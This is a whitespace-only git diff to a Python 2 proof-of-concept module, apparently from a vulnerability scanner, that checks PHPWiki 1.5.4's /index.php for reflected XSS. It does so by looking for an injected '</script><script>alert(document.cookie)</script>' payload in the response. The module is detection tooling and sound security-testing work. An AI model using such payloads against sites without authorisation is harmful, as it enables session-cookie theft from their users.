@@ -6,6 +6,7 @@ import urllib2
 import urllib
 import re
 
+
 class Vuln(ABVuln):
     vuln_id = 'PHPWiki_0000'  # 平台漏洞编号，留空
     name = 'PHPWiki 1.5.4 /index.php  XSS'  # 漏洞名称
@@ -20,6 +21,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'PHPWiki'  # 漏洞应用名称
     product_version = 'PHPWiki 1.5.4 /index.php  XSS漏洞'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'd5da311a-5dd9-4667-a893-2d38fbcd401a'
@@ -42,14 +44,15 @@ class Poc(ABPoc):
             statecode = urllib.urlopen(verify_url).getcode()
             content = req.read()
             if statecode == 200 and re.search('var pagename  = \'</script><script>alert\(document\.cookie\)</script><!--\'', content):
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
